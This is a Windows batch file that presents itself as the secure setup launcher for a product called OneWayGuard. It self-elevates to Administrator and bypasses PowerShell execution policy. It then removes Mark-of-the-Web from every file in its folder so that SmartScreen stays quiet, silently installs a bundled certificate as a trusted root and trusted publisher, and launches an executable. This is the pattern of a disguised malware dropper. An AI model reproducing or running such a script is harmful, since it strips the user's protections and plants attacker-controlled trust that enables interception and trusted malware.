@echo off
:: =========================================================================
:: OneWayGuard - Secure Installation Launcher
:: Automatically authorizes the genuine certificate and launches the setup wizard
:: with zero Windows Defender SmartScreen interference.
:: =========================================================================
setlocal EnableDelayedExpansion

:: 1. Self-elevate to Administrator to authorize certificate
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [*] Requesting Administrator privilege to authorize security certificate...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process '%~0' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"
title OneWayGuard - Secure Setup Launcher

echo ========================================================================
echo         ONEWAYGUARD DEFENSE FORENSICS - SECURE INITIALIZATION
echo ========================================================================
echo.
echo [*] Step 1/3: Removing Windows Mark-of-the-Web (Zone.Identifier)...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%~dp0' -Recurse -ErrorAction SilentlyContinue | Unblock-File" >nul 2>&1

echo [*] Step 2/3: Authorizing Security Certificate in Windows Defender...
if exist "OneWayGuard_Security_Certificate.cer" (
    certutil -addstore -f "Root" "OneWayGuard_Security_Certificate.cer" >nul 2>&1
    certutil -addstore -f "TrustedPublisher" "OneWayGuard_Security_Certificate.cer" >nul 2>&1
    echo [+] OneWayGuard registered as a Trusted Publisher.
)

echo [*] Step 3/3: Launching OneWayGuard Setup Wizard...
if exist "OneWayGuard-Setup-Win64.exe" (
    start "" "OneWayGuard-Setup-Win64.exe"
) else if exist "OneWayGuard.exe" (
    start "" "OneWayGuard.exe"
)
exit /b
